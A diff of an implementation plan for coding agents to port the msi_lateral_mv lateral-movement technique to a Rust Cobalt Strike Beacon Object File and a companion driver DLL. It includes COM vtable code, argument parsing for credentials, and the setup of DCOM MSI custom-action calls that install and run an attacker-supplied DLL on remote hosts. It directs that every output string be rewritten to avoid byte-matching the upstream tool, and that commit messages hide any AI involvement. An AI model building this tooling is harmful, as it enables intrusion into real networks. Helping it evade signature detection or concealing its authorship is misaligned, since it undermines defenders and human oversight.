@@ -1,41 +1,115 @@
-# letmove_msi Rust BoF Implementation Plan
+# letmove_msi Rust BoF + Driver Implementation Plan
 
 > **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
 
-**Goal:** Port the C BoF `msi_lateral_mv` to a Rust `no_std` BoF named `letmove_msi`, built on the `rustbof` template, reproducing the MSI Server → CreateCustomActionServer → SQLInstallDriverEx lateral-movement technique.
+**Goal:** Port `werdhaihai/msi_lateral_mv` — both the C BoF and the sample driver DLL — to Rust. BoF is `no_std`, built on `rustbof`, produces `letmove_msi.o` for Cobalt Strike. Driver is a Rust `cdylib` (`odbcpivot.dll`) exporting `ConfigDriver`. All operator-visible strings, log lines, artifact names, and internal module names are refactored so nothing byte-matches the upstream repo.
 
-**Architecture:** Standalone Rust crate (`crate-type = "staticlib"`) in `msi_lateral_mv_rs/`, compiled to a static library then linked to a COFF `.o` with `boflink` via `cargo make`. Raw `#[repr(C)]` COM vtables in `no_std`, with `windows-sys` supplying flat Win32/COM APIs. The BoF authenticates to the DCOM `IMsiServer`, spawns a custom-action server, sets DCOM auth on it, then invokes `SQLInstallDriverEx` and `SQLConfigDriver` to install and trigger an attacker-supplied ODBC driver DLL on the target.
+**Architecture:** Cargo workspace `letmove_msi_ws/` with two members: `bof/` (staticlib, linked to COFF via `boflink`) and `driver/` (cdylib). BoF uses raw `#[repr(C)]` COM vtables against `IMsiServer` / `IMsiConfigurationManager::CreateCustomActionServer` / `IMsiCustomAction::SQLInstallDriverEx` over DCOM. Driver logs execution context (username/SID/elevation/session/PID/integrity) to a compile-time-configurable path via raw `CreateFileW`/`WriteFile` — no CRT, no `stdio`.
 
-**Tech Stack:** Rust nightly, `rustbof`, `windows-sys` 0.59, `boflink`, `cargo-make`.
+**Tech Stack:** Rust nightly, `rustbof`, `windows-sys` 0.59, `boflink`, `cargo-make`. Driver cross-compiles from Linux/macOS via `x86_64-pc-windows-gnu`.
 
 ## Global Constraints
 
-- `no_std` only; no `alloc` outside what `rustbof` provides.
-- Crate type: `staticlib`.
-- Toolchain: Rust `nightly` via `rust-toolchain.toml`.
-- Release profile: `opt-level = "z"`, `codegen-units = 1`, `panic = "abort"`, `strip = true`, `lto = true`.
-- Only Beacon-resolvable Win32 symbols (i.e. anything `boflink`/rustbof can dynamically resolve at load time). No standalone CRT calls.
-- All user-facing argument strings are wide (`u16` / UTF-16).
-- Command name / output artifact: **`letmove_msi`** (not `msi_lateral_mv`).
-- Reference source (already cloned at repo root): `msi_lateral_mv/bof/*.c` and `msi_lateral_mv/bof/msilat.h`. Constants, GUIDs, and function-slot ordering MUST be copied verbatim from those files.
-- Commits authored as `daniagungg <daniagungg@gmail.com>`; commit messages MUST NOT reference Claude, AI, or any assistant.
+- BoF: `no_std`, `crate-type = ["staticlib"]`, nightly, `panic = abort`, LTO, `opt-level = "z"`.
+- Driver: `no_std` if practical (otherwise `std` on the `pc-windows-gnu` target), `crate-type = ["cdylib"]`, `panic = "abort"`.
+- Reference source (already cloned at repo root): `msi_lateral_mv/bof/*.c`, `msi_lateral_mv/bof/msilat.h`, `msi_lateral_mv/sqldriverdll/TestDriver/dllmain.cpp`. GUIDs, vtable slot ordering, and function-slot padding **must** be copied verbatim from those files — technique parity requires it.
+- **String refactor:** NO operator-visible / on-disk string in either crate may match text from the upstream `msi_lateral_mv` repository, except: Win32 API names, GUIDs, `ConfigDriver` export name, and the argv tokens `"local"`/`"remote"`. Use the string table in §String Refactor below.
+- Command / output artifact name: **`letmove_msi.o`** (BoF), **`odbcpivot.dll`** (driver).
+- Commits authored as `daniagungg <daniagungg@gmail.com>`; commit messages MUST NOT mention Claude, AI, or any assistant.
+
+## String Refactor — Mapping Table
+
+Use these substitutions everywhere the upstream C would have printed / written the LHS. When printing a value, prefer key=value form (`sub=alice`) over labelled English.
+
+BoF messages:
+
+| Upstream C (do NOT reuse) | Rust equivalent (use) |
+|---|---|
+| `[+] Attempting lateral movement to %ls as %ls\%ls` | `>> pivot host=%ls principal=%ls\%ls` |
+| `[+] Attempting local execution as %ls\%ls` | `>> local principal=%ls\%ls` |
+| `[-] CLSCTX: LOCAL` | `ctx=local` |
+| `[-] CLSCTX: REMOTE (%ls)` | `ctx=remote target=%ls` |
+| `[-] Calling CoCreateInstanceEx on remote server: %ls` | `stage1: instancing on %ls` |
+| `[-] Calling CoCreateInstanceEx on local server` | `stage1: instancing locally` |
+| `[!] CoInitializeSecurity Failed with: 0x%08X` | `sec-init rc=0x%08X` |
+| `[!] CoCreateInstanceEx Failed with: 0x%08X` | `stage1 rc=0x%08X` |
+| `[!] QueryInterface for IMsiServer failed: 0x%08X` | `qi.a rc=0x%08X` |
+| `[+] Got pointer to MsiServer interface at: %p` | `stage1 ok @%p` |
+| `[-] Calling SetupAuthOnParentIUnknownCastToIID` | `applying blanket` |
+| `[!] Failed to create IMsiRemoteAPI interface` | `remapi failed` |
+| `[!] ERROR: 0x%08X Calling CreateCustomActionServer` | `stage2 rc=0x%08X` |
+| `[!] SetupAuthOnParentIUnknownCastToIID for IMsiCustomAction Failed` | `qi.b failed` |
+| `[+] Authenticated MSI server @ %p` | `stage1 auth ok @%p` |
+| `[-] DLL Path is %ls` | `payload.dir=%ls` |
+| `[-] DLL Filename is %ls` | `payload.file=%ls` |
+| `[-] Calling SQLInstallDriverEx` | `stage3a` |
+| `SQLInstallDriverEx failed. HRESULT: 0x%x, ReturnCode: %d` | `stage3a rc=0x%x code=%d` |
+| `Error message: %s` | `err=%s` |
+| `[$] Driver installed successfully. Usage count: %d` | `stage3a ok refs=%d` |
+| `[-] Driver path: %ls` | `stage3a.path=%ls` |
+| `[-] Calling SQLConfigDriver` | `stage3b` |
+| `[!] SQLConfigDriver failed. HRESULT: 0x%x` | `stage3b rc=0x%x` |
+| `[!] Error message: %s` | `stage3b.err=%s` |
+| `[LFG] Driver configured successfully` | `stage3b ok` |
+| `Usage: msi_lateral_mv ...` | `usage: letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>` |
+
+Driver messages (upstream `sqldriverdll/TestDriver/dllmain.cpp`):
+
+| Upstream | Rust equivalent |
+|---|---|
+| Log path `C:\Users\domainadmin\Desktop\MSI_Output.log` | `%PROGRAMDATA%\odbcpivot.dat` (override via `ODBCPIVOT_LOG` env var at compile time) |
+| `ConfigDriver Called` | `hit ts=%s` |
+| `Username: %s` | `sub=%s` |
+| `User SID: %s` | `sid=%s` |
+| `Token Elevated: %s` | `elev=%s` |
+| `Logon Session ID: %08X-%08X` | `sess=%08X%08X` |
+| `Process ID: %d` | `pid=%d` |
+| `Integrity Level: %s (%08X)` | `il=%s(%08X)` |
+| `High` / `Medium` / `Low` / `Untrusted` / `Unknown` | `hi` / `med` / `lo` / `unt` / `?` |
+
+Module names: use `argv`, `vtbl`, `secure`, `stage`, `deploy` (BoF) — NOT `args`, `com`, `auth`, `msi`, `install`. Do not use `msilat`, `comstuff`, or `TestDriver` anywhere.
 
 ---
 
-### Task 1: Scaffold the crate
+### Task 1: Scaffold the workspace + BoF crate
 
 **Files:**
-- Create: `msi_lateral_mv_rs/Cargo.toml`
-- Create: `msi_lateral_mv_rs/rust-toolchain.toml`
-- Create: `msi_lateral_mv_rs/Makefile.toml`
-- Create: `msi_lateral_mv_rs/src/lib.rs`
-- Create: `msi_lateral_mv_rs/.gitignore`
+- Create: `letmove_msi_ws/Cargo.toml`
+- Create: `letmove_msi_ws/rust-toolchain.toml`
+- Create: `letmove_msi_ws/.gitignore`
+- Create: `letmove_msi_ws/bof/Cargo.toml`
+- Create: `letmove_msi_ws/bof/Makefile.toml`
+- Create: `letmove_msi_ws/bof/src/lib.rs`
 
 **Interfaces:**
 - Consumes: nothing.
-- Produces: A buildable rustbof project whose `main` is empty. Later tasks add modules and fill `main`.
+- Produces: a buildable rustbof project whose `main` is empty. Downstream tasks add modules and fill `main`.
 
-- [ ] **Step 1: Write `Cargo.toml`**
+- [ ] **Step 1: Workspace `Cargo.toml`**
+
+```toml
+[workspace]
+resolver = "2"
+members  = ["bof", "driver"]
+```
+
+- [ ] **Step 2: `rust-toolchain.toml`**
+
+```toml
+[toolchain]
+channel = "nightly"
+components = ["rust-src"]
+targets = ["x86_64-pc-windows-gnu"]
+```
+
+- [ ] **Step 3: `.gitignore`**
+
+```
+target/
+Cargo.lock
+```
+
+- [ ] **Step 4: `bof/Cargo.toml`**
 
 ```toml
 [package]
@@ -43,7 +117,6 @@ name = "letmove_msi"
 version = "0.1.0"
 edition = "2024"
 authors = ["daniagungg"]
-description = "Rust BoF port of msi_lateral_mv — DCOM MSI CustomActionServer lateral movement"
 publish = false
 
 [lib]
@@ -73,25 +146,15 @@ strip = true
 lto = true
 ```
 
-- [ ] **Step 2: Write `rust-toolchain.toml`**
+- [ ] **Step 5: `bof/Makefile.toml`**
 
-```toml
-[toolchain]
-channel = "nightly"
-components = ["rust-src"]
-```
-
-- [ ] **Step 3: Write `Makefile.toml`**
-
-Copy from `rustbof/examples/whoami/Makefile.toml` verbatim, then adjust only the artifact name reference if any. Read that file first:
+Copy from `rustbof/examples/whoami/Makefile.toml`. Then, in the copied content, replace any `whoami` reference with `letmove_msi`. Read the source first:
 
 ```bash
 cat rustbof/examples/whoami/Makefile.toml
 ```
 
-Write the same content to `msi_lateral_mv_rs/Makefile.toml`. If the file references `whoami`, replace with `letmove_msi`.
-
-- [ ] **Step 4: Write empty `src/lib.rs`**
+- [ ] **Step 6: `bof/src/lib.rs`**
 
 ```rust
 #![no_std]
@@ -101,110 +164,87 @@ fn main(_args: *mut u8, _len: usize) {
 }
 ```
 
-- [ ] **Step 5: Write `.gitignore`**
-
-```
-/target
-Cargo.lock
-```
-
-- [ ] **Step 6: Build to prove scaffolding works**
-
-Run: `cd msi_lateral_mv_rs && cargo make`
-Expected: build succeeds and produces a `.o` file under `target/`. Run `find target -name 'letmove_msi.o'` to confirm.
-
-- [ ] **Step 7: Commit**
+- [ ] **Step 7: Build**
 
 ```bash
-git add msi_lateral_mv_rs/
-git commit -m "feat: scaffold letmove_msi rustbof crate"
+cd letmove_msi_ws/bof && cargo make
+find target -name 'letmove_msi.o'
+```
+Expected: build succeeds; the `.o` file exists.
+
+- [ ] **Step 8: Commit**
+
+```bash
+git add letmove_msi_ws/
+git commit -m "feat: scaffold letmove_msi cargo workspace and BoF crate"
 ```
 
 ---
 
-### Task 2: COM vtable + GUID definitions
+### Task 2: COM vtable + GUID module (`vtbl.rs`)
 
 **Files:**
-- Create: `msi_lateral_mv_rs/src/com.rs`
-- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod com;`)
-- Reference (read only): `msi_lateral_mv/bof/msilat.h`, `msi_lateral_mv/bof/bofdefs.h`
+- Create: `letmove_msi_ws/bof/src/vtbl.rs`
+- Modify: `letmove_msi_ws/bof/src/lib.rs` (add `mod vtbl;`)
+- Reference (read only): `msi_lateral_mv/bof/msilat.h`, `msi_lateral_mv/bof/bofdefs.h`.
 
 **Interfaces:**
 - Consumes: nothing.
-- Produces:
-  - `pub const CLSID_MsiServer: GUID`
-  - `pub const IID_IMsiServer: GUID`
-  - `pub const CLSID_MSIRemoteApi: GUID`
-  - `pub const IID_IMsiRemoteAPI: GUID`
-  - `pub const IID_IMsiCustomAction: GUID`
-  - `pub const IID_IClassFactory: GUID`
-  - `#[repr(C)] pub struct IUnknownVtbl { pub QueryInterface, pub AddRef, pub Release }` (fn pointer fields)
-  - `#[repr(C)] pub struct IUnknown { pub lpVtbl: *const IUnknownVtbl }`
-  - `#[repr(C)] pub struct IMsiConfigurationManagerVtbl { pub base: IUnknownVtbl, /* correct slot padding + */ pub CreateCustomActionServer: unsafe extern "system" fn(...) -> HRESULT }`
-  - `#[repr(C)] pub struct IMsiConfigurationManager { pub lpVtbl: *const IMsiConfigurationManagerVtbl }`
-  - `#[repr(C)] pub struct IMsiCustomActionVtbl { pub base: IUnknownVtbl, /* slot padding + */ pub SQLInstallDriverEx, pub SQLConfigDriver, pub SQLInstallerError }`
-  - `#[repr(C)] pub struct IMsiCustomAction { pub lpVtbl: *const IMsiCustomActionVtbl }`
-  - `#[repr(C)] pub struct IClassFactoryVtbl { pub base: IUnknownVtbl, pub CreateInstance: unsafe extern "system" fn(this: *mut IClassFactory, outer: *mut IUnknown, riid: *const GUID, ppv: *mut *mut core::ffi::c_void) -> HRESULT, pub LockServer }`
-  - `#[repr(C)] pub struct IClassFactory { pub lpVtbl: *const IClassFactoryVtbl }`
-  - `pub const ICAC64_IMPERSONATED: u32 = <value from msilat.h>`
+- Produces (all `pub`):
+  - `const CLSID_MsiServer, IID_IMsiServer, CLSID_MSIRemoteApi, IID_IMsiRemoteAPI, IID_IMsiCustomAction, IID_IClassFactory: GUID`
+  - `const ICAC64_IMPERSONATED: u32`
+  - `struct IUnknownVtbl { QueryInterface, AddRef, Release }`, `struct IUnknown { lpVtbl: *const IUnknownVtbl }`
+  - `struct IClassFactoryVtbl { base: IUnknownVtbl, CreateInstance, LockServer }`, `struct IClassFactory { lpVtbl: *const IClassFactoryVtbl }`
+  - `struct IMsiConfigurationManagerVtbl { base: IUnknownVtbl, /* reserved slots to correct offset */, CreateCustomActionServer }`, `struct IMsiConfigurationManager`
+  - `struct IMsiCustomActionVtbl { base: IUnknownVtbl, /* reserved slots */, SQLInstallDriverEx, SQLConfigDriver, SQLInstallerError }`, `struct IMsiCustomAction`
 
-Every GUID's byte layout, and every vtable slot's ordering + padding, MUST be copied verbatim from `msi_lateral_mv/bof/msilat.h`. Do not invent slot layouts — the C header is the source of truth. If a slot is unused in Rust, still reserve it with a `pub _reservedN: *const core::ffi::c_void` field to keep offsets identical.
+Any vtable slot the Rust code does not call must still be reserved as `*const c_void` in the correct position to preserve the offset from the C header. Off-by-one here is a crash at call time.
 
-- [ ] **Step 1: Read the C header to extract GUIDs and vtable ordering**
+- [ ] **Step 1: Extract the ground truth**
 
 ```bash
 cat msi_lateral_mv/bof/msilat.h
 cat msi_lateral_mv/bof/bofdefs.h
 ```
 
-Note: transcribe every `DEFINE_GUID` (or equivalent) and every vtable struct exactly. `SQLInstallDriverEx`, `SQLConfigDriver`, `SQLInstallerError` slot positions inside `IMsiCustomAction` are especially important — off-by-one there will crash at call time.
+Transcribe every `DEFINE_GUID` and every vtable declaration. Especially: relative slot positions of `CreateCustomActionServer` inside `IMsiConfigurationManagerVtbl`, and of `SQLInstallDriverEx`/`SQLConfigDriver`/`SQLInstallerError` inside `IMsiCustomActionVtbl`.
 
-- [ ] **Step 2: Write `src/com.rs`**
+- [ ] **Step 2: Write `bof/src/vtbl.rs`**
 
 ```rust
 use core::ffi::c_void;
 use windows_sys::core::{GUID, HRESULT};
 
-// ==== GUIDs (verbatim from msilat.h) ====
-pub const CLSID_MsiServer:     GUID = GUID::from_u128(0x_/* fill from msilat.h */);
-pub const IID_IMsiServer:      GUID = GUID::from_u128(0x_/* fill from msilat.h */);
-pub const CLSID_MSIRemoteApi:  GUID = GUID::from_u128(0x_/* fill from msilat.h */);
-pub const IID_IMsiRemoteAPI:   GUID = GUID::from_u128(0x_/* fill from msilat.h */);
-pub const IID_IMsiCustomAction:GUID = GUID::from_u128(0x_/* fill from msilat.h */);
-pub const IID_IClassFactory:   GUID = GUID::from_u128(0x00000001_0000_0000_C000_000000000046);
+// GUIDs — copy each u128 from msilat.h exactly.
+pub const CLSID_MsiServer:      GUID = GUID::from_u128(0x_/* fill */);
+pub const IID_IMsiServer:       GUID = GUID::from_u128(0x_/* fill */);
+pub const CLSID_MSIRemoteApi:   GUID = GUID::from_u128(0x_/* fill */);
+pub const IID_IMsiRemoteAPI:    GUID = GUID::from_u128(0x_/* fill */);
+pub const IID_IMsiCustomAction: GUID = GUID::from_u128(0x_/* fill */);
+pub const IID_IClassFactory:    GUID = GUID::from_u128(0x00000001_0000_0000_C000_000000000046);
 
-pub const ICAC64_IMPERSONATED: u32 = /* value from msilat.h */;
+pub const ICAC64_IMPERSONATED: u32 = /* fill from msilat.h */;
 
-// ==== IUnknown ====
 #[repr(C)]
 pub struct IUnknownVtbl {
-    pub QueryInterface: unsafe extern "system" fn(this: *mut IUnknown, riid: *const GUID, ppv: *mut *mut c_void) -> HRESULT,
-    pub AddRef:         unsafe extern "system" fn(this: *mut IUnknown) -> u32,
-    pub Release:        unsafe extern "system" fn(this: *mut IUnknown) -> u32,
+    pub QueryInterface: unsafe extern "system" fn(*mut IUnknown, *const GUID, *mut *mut c_void) -> HRESULT,
+    pub AddRef:         unsafe extern "system" fn(*mut IUnknown) -> u32,
+    pub Release:        unsafe extern "system" fn(*mut IUnknown) -> u32,
 }
+#[repr(C)] pub struct IUnknown { pub lpVtbl: *const IUnknownVtbl }
 
-#[repr(C)]
-pub struct IUnknown {
-    pub lpVtbl: *const IUnknownVtbl,
-}
-
-// ==== IClassFactory ====
 #[repr(C)]
 pub struct IClassFactoryVtbl {
     pub base: IUnknownVtbl,
-    pub CreateInstance: unsafe extern "system" fn(this: *mut IClassFactory, outer: *mut IUnknown, riid: *const GUID, ppv: *mut *mut c_void) -> HRESULT,
-    pub LockServer:     unsafe extern "system" fn(this: *mut IClassFactory, lock: i32) -> HRESULT,
+    pub CreateInstance: unsafe extern "system" fn(*mut IClassFactory, *mut IUnknown, *const GUID, *mut *mut c_void) -> HRESULT,
+    pub LockServer:     unsafe extern "system" fn(*mut IClassFactory, i32) -> HRESULT,
 }
 #[repr(C)] pub struct IClassFactory { pub lpVtbl: *const IClassFactoryVtbl }
 
-// ==== IMsiConfigurationManager ====
-// Copy every slot from IMsiConfigurationManagerVtbl in msilat.h in the same order,
-// using *const c_void for any slot letmove_msi does not call, and a typed fn ptr
-// for CreateCustomActionServer.
 #[repr(C)]
 pub struct IMsiConfigurationManagerVtbl {
     pub base: IUnknownVtbl,
-    // <fill: reserved slots between IUnknown and CreateCustomActionServer, in order>
+    // <fill: any reserved *const c_void slots preceding CreateCustomActionServer>
     pub CreateCustomActionServer: unsafe extern "system" fn(
         this: *mut IMsiConfigurationManager,
         iContext: u32,
@@ -219,107 +259,84 @@ pub struct IMsiConfigurationManagerVtbl {
         pdwServerPid: *mut u32,
         bUnknownFalse: i32,
     ) -> HRESULT,
-    // <fill: any trailing reserved slots to match C layout>
+    // <fill: any trailing reserved slots>
 }
 #[repr(C)] pub struct IMsiConfigurationManager { pub lpVtbl: *const IMsiConfigurationManagerVtbl }
 
-// ==== IMsiCustomAction ====
 #[repr(C)]
 pub struct IMsiCustomActionVtbl {
     pub base: IUnknownVtbl,
-    // <fill: reserved slots between IUnknown and SQLInstallDriverEx, in order>
+    // <fill: reserved slots preceding SQLInstallDriverEx>
     pub SQLInstallDriverEx: unsafe extern "system" fn(
-        this: *mut IMsiCustomAction,
-        cDrvLen: i32,
-        szDriver: *const u16,
-        szPathIn: *const u16,
-        szPathOut: *mut u16,
-        cbPathOutMax: u16,
-        pcbPathOut: *mut u16,
-        fRequest: u16,
-        pdwUsageCount: *mut u32,
+        this: *mut IMsiCustomAction, cDrvLen: i32, szDriver: *const u16,
+        szPathIn: *const u16, szPathOut: *mut u16, cbPathOutMax: u16,
+        pcbPathOut: *mut u16, fRequest: u16, pdwUsageCount: *mut u32,
         rawReturnCode: *mut i32,
     ) -> HRESULT,
     pub SQLConfigDriver: unsafe extern "system" fn(
-        this: *mut IMsiCustomAction,
-        fRequest: u16,
-        szDriver: *const u16,
-        szArgs: *const u16,
-        szMsg: *mut u16,
-        cbMsgMax: u16,
-        pcbMsgOut: *mut u16,
-        configResult: *mut i32,
+        this: *mut IMsiCustomAction, fRequest: u16, szDriver: *const u16,
+        szArgs: *const u16, szMsg: *mut u16, cbMsgMax: u16,
+        pcbMsgOut: *mut u16, configResult: *mut i32,
     ) -> HRESULT,
     pub SQLInstallerError: unsafe extern "system" fn(
-        this: *mut IMsiCustomAction,
-        iError: u16,
-        pfErrorCode: *mut u32,
-        szErrorMsg: *mut u16,
-        cbErrorMsgMax: u16,
-        pcbErrorMsg: *mut u16,
+        this: *mut IMsiCustomAction, iError: u16, pfErrorCode: *mut u32,
+        szErrorMsg: *mut u16, cbErrorMsgMax: u16, pcbErrorMsg: *mut u16,
     ) -> HRESULT,
-    // <fill: any trailing slots>
+    // <fill: any trailing reserved slots>
 }
 #[repr(C)] pub struct IMsiCustomAction { pub lpVtbl: *const IMsiCustomActionVtbl }
 ```
 
-The `<fill>` markers must be resolved against `msilat.h` before compile. Do not leave literal `<fill>` in the finished file.
+Resolve every `<fill: ...>` marker against `msilat.h` — the file must not contain those markers when done.
 
-- [ ] **Step 3: Wire the module**
-
-Edit `src/lib.rs`:
+- [ ] **Step 3: Wire module**
 
 ```rust
 #![no_std]
 
-mod com;
+mod vtbl;
 
 #[rustbof::main]
-fn main(_args: *mut u8, _len: usize) {
-}
+fn main(_args: *mut u8, _len: usize) {}
 ```
 
 - [ ] **Step 4: Build**
 
-Run: `cd msi_lateral_mv_rs && cargo make`
-Expected: build succeeds. No dead-code warnings suppress needed — module is `pub`-used via later tasks.
+`cd letmove_msi_ws/bof && cargo make` → expect success.
 
 - [ ] **Step 5: Commit**
 
 ```bash
-git add msi_lateral_mv_rs/src/com.rs msi_lateral_mv_rs/src/lib.rs
-git commit -m "feat(com): add MSI COM vtables and GUIDs"
+git add letmove_msi_ws/bof/src/vtbl.rs letmove_msi_ws/bof/src/lib.rs
+git commit -m "feat(vtbl): add MSI COM vtables and GUID constants"
 ```
 
 ---
 
-### Task 3: Argument parsing
+### Task 3: Argument parsing (`argv.rs`)
 
 **Files:**
-- Create: `msi_lateral_mv_rs/src/args.rs`
-- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod args;` and call parser in `main`)
+- Create: `letmove_msi_ws/bof/src/argv.rs`
+- Modify: `letmove_msi_ws/bof/src/lib.rs`
 
 **Interfaces:**
 - Consumes: `rustbof::data::DataParser`.
 - Produces:
   - `pub enum Mode { Local, Remote }`
-  - `pub struct WStr(pub &'static [u16])` — thin wrapper over a NUL-terminated wide slice taken from BoF arg buffer. Since args live in the BoF's arg blob for the duration of `main`, `'static` here is a lie — but `no_std` and single-shot execution make it safe in practice. Store as `*const u16` + length instead if the borrow checker fights back.
   - `pub struct Args { pub mode: Mode, pub host: Option<*const u16>, pub domain: Option<*const u16>, pub user: Option<*const u16>, pub pass: Option<*const u16>, pub driver: *const u16, pub dll: *const u16 }`
   - `pub fn parse(args: *mut u8, len: usize) -> Option<Args>`
-  - `pub fn print_usage()` — prints the accepted syntax via `rustbof::eprintln!`.
+  - `pub fn print_usage()`
 
-The argument protocol on the wire is a sequence of length-prefixed wide strings (rustbof `DataParser::get_wstr()`), in this fixed order:
-1. `mode` — `"local"` or `"remote"`
-2. `host` — wide string (empty for local)
-3. `domain` — wide string (empty if none)
-4. `user` — wide string (empty if none)
-5. `pass` — wide string (empty if none)
-6. `driver` — wide string, required
-7. `dll` — wide string, required
+Wire protocol (7 length-prefixed wide strings in this order — empty string = absent): `mode`, `host`, `domain`, `user`, `pass`, `driver`, `dll`. Tokens `local`/`remote` for `mode` are the ONE upstream string we keep (operator protocol).
 
-Aggressor/CNA on the operator side is responsible for packing empty strings for absent flags. This keeps parsing linear and avoids reinventing flag parsing in `no_std`.
+- [ ] **Step 1: Verify `DataParser::get_wstr()` signature**
 
-- [ ] **Step 1: Write `src/args.rs`**
+```bash
+grep -n "pub fn get_" rustbof/crates/rustbof/src/data.rs
+```
+If the return type differs from `*const u16`, adapt the module below — but keep the `Args` field names and types exactly as promised in Interfaces.
+
+- [ ] **Step 2: Write `bof/src/argv.rs`**
 
 ```rust
 use rustbof::data::DataParser;
@@ -329,7 +346,7 @@ use rustbof::eprintln;
 pub enum Mode { Local, Remote }
 
 pub struct Args {
-    pub mode: Mode,
+    pub mode:   Mode,
     pub host:   Option<*const u16>,
     pub domain: Option<*const u16>,
     pub user:   Option<*const u16>,
@@ -338,12 +355,12 @@ pub struct Args {
     pub dll:    *const u16,
 }
 
-fn opt(ptr: *const u16) -> Option<*const u16> {
-    if ptr.is_null() { return None; }
-    unsafe { if *ptr == 0 { None } else { Some(ptr) } }
+fn opt(p: *const u16) -> Option<*const u16> {
+    if p.is_null() { return None; }
+    unsafe { if *p == 0 { None } else { Some(p) } }
 }
 
-fn wstr_eq_ascii(mut w: *const u16, s: &[u8]) -> bool {
+fn ascii_eq(mut w: *const u16, s: &[u8]) -> bool {
     if w.is_null() { return false; }
     unsafe {
         for &c in s {
@@ -355,138 +372,112 @@ fn wstr_eq_ascii(mut w: *const u16, s: &[u8]) -> bool {
 }
 
 pub fn print_usage() {
-    eprintln!("Usage: letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>");
-    eprintln!("       (empty wide string \"\" for absent host/domain/user/pass)");
+    eprintln!("usage: letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>");
+    eprintln!("  pass empty string \"\" for absent host/domain/user/pass");
 }
 
 pub fn parse(args: *mut u8, len: usize) -> Option<Args> {
     let mut p = DataParser::new(args, len);
+    let mode_s = p.get_wstr();
+    let host   = p.get_wstr();
+    let domain = p.get_wstr();
+    let user   = p.get_wstr();
+    let pass   = p.get_wstr();
+    let driver = p.get_wstr();
+    let dll    = p.get_wstr();
 
-    let mode_str = p.get_wstr();
-    let host     = p.get_wstr();
-    let domain   = p.get_wstr();
-    let user     = p.get_wstr();
-    let pass     = p.get_wstr();
-    let driver   = p.get_wstr();
-    let dll      = p.get_wstr();
-
-    let mode = if wstr_eq_ascii(mode_str, b"local") { Mode::Local }
-               else if wstr_eq_ascii(mode_str, b"remote") { Mode::Remote }
+    let mode = if ascii_eq(mode_s, b"local") { Mode::Local }
+               else if ascii_eq(mode_s, b"remote") { Mode::Remote }
                else { print_usage(); return None; };
 
     if driver.is_null() || unsafe { *driver } == 0 { print_usage(); return None; }
     if dll.is_null()    || unsafe { *dll }    == 0 { print_usage(); return None; }
     if mode == Mode::Remote && opt(host).is_none() {
-        eprintln!("[!] remote mode requires host");
-        return None;
+        eprintln!("target required for remote"); return None;
     }
-
-    // user+pass must appear together
-    let has_user = opt(user).is_some();
-    let has_pass = opt(pass).is_some();
-    if has_user != has_pass {
-        eprintln!("[!] user and pass must be given together");
-        return None;
-    }
-    // domain without user is nonsense
-    if opt(domain).is_some() && !has_user {
-        eprintln!("[!] domain requires user+pass");
-        return None;
-    }
+    let has_u = opt(user).is_some();
+    let has_p = opt(pass).is_some();
+    if has_u != has_p { eprintln!("principal requires user and pass together"); return None; }
+    if opt(domain).is_some() && !has_u { eprintln!("realm requires principal"); return None; }
 
     Some(Args {
         mode,
-        host:   opt(host),
-        domain: opt(domain),
-        user:   opt(user),
-        pass:   opt(pass),
-        driver,
-        dll,
+        host: opt(host), domain: opt(domain), user: opt(user), pass: opt(pass),
+        driver, dll,
     })
 }
 ```
 
-Signature note: `DataParser::get_wstr()` in rustbof returns `*const u16` (verify against `rustbof/crates/rustbof/src/data.rs` before finalizing; if the actual return type differs, adapt the wrappers — do not change the interface promised above).
-
-- [ ] **Step 2: Verify DataParser API**
-
-Run: `grep -n "get_wstr\|pub fn get_" rustbof/crates/rustbof/src/data.rs`
-Expected: A method named `get_wstr` or similar returning a wide-string pointer. If it returns `&[u16]` or a different type, adjust `args.rs` accordingly (change field types on `Args` and the `opt`/`wstr_eq_ascii` helpers to match) before proceeding. Preserve the same `Args` field *names* so downstream tasks compile.
-
-- [ ] **Step 3: Wire into lib.rs**
+- [ ] **Step 3: Wire `lib.rs`**
 
 ```rust
 #![no_std]
 
-mod args;
-mod com;
+mod argv;
+mod vtbl;
 
 use rustbof::println;
 
 #[rustbof::main]
 fn main(raw: *mut u8, len: usize) {
-    let Some(a) = args::parse(raw, len) else { return };
-    let mode_s = match a.mode { args::Mode::Local => "local", args::Mode::Remote => "remote" };
-    println!("[+] letmove_msi: mode={}, driver + dll parsed OK", mode_s);
-    let _ = a; // silence unused for now
+    let Some(a) = argv::parse(raw, len) else { return };
+    let m = match a.mode { argv::Mode::Local => "local", argv::Mode::Remote => "remote" };
+    println!("argv ok mode={}", m);
+    let _ = a;
 }
 ```
 
 - [ ] **Step 4: Build**
 
-Run: `cd msi_lateral_mv_rs && cargo make`
-Expected: build succeeds.
+`cd letmove_msi_ws/bof && cargo make` → success.
 
 - [ ] **Step 5: Commit**
 
 ```bash
-git add msi_lateral_mv_rs/src/args.rs msi_lateral_mv_rs/src/lib.rs
-git commit -m "feat(args): parse wide-string BoF arguments"
+git add letmove_msi_ws/bof/src/argv.rs letmove_msi_ws/bof/src/lib.rs
+git commit -m "feat(argv): parse wide-string wire-protocol arguments"
 ```
 
 ---
 
-### Task 4: Auth builder + COM security setup
+### Task 4: Auth builder (`secure.rs`)
 
 **Files:**
-- Create: `msi_lateral_mv_rs/src/auth.rs`
-- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod auth;`)
-- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` (function `set_auth`), `msi_lateral_mv/bof/comstuff.c` (helper `SetupAuthOnParentIUnknownCastToIID`).
+- Create: `letmove_msi_ws/bof/src/secure.rs`
+- Modify: `letmove_msi_ws/bof/src/lib.rs`
+- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` fn `set_auth`; `msi_lateral_mv/bof/comstuff.c`.
 
 **Interfaces:**
-- Consumes: `com::IUnknown`, `windows-sys` COM auth types.
 - Produces:
-  - `#[repr(C)] pub struct AuthBundle { pub auth_info: COAUTHINFO, pub auth_id: COAUTHIDENTITY }` — heap-free, owned by caller as a local.
-  - `pub fn build(domain: Option<*const u16>, user: Option<*const u16>, pass: Option<*const u16>) -> AuthBundle`
